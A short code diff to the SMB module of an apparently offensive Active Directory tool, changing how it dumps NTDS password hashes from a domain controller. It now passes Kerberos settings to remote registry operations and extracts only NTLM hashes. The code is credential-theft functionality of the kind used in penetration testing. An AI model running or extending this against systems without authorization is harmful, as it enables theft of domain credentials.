@@ -999,7 +999,7 @@ class smb(connection):
             return
 
         try:
-            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
+            self.remote_ops  = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
             self.remote_ops.enableRegistry()
             self.bootkey = self.remote_ops.getBootKey()
         except Exception as e:
@@ -1103,7 +1103,7 @@ class smb(connection):
         add_ntds_hash.ntds_hashes = 0
         add_ntds_hash.added_to_db = 0
 
-        if self.remote_ops:
+        if self.remote_ops: 
             try:
                 if self.args.ntds == 'vss':
                     NTDSFileName = self.remote_ops.saveNTDS()
@@ -1119,7 +1119,7 @@ class smb(connection):
                 self.logger.error(e)
 
         NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
-                        remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
+                        remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=True,
                         pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename,
                         justUser=None, printUserStatus=False,
                         perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))
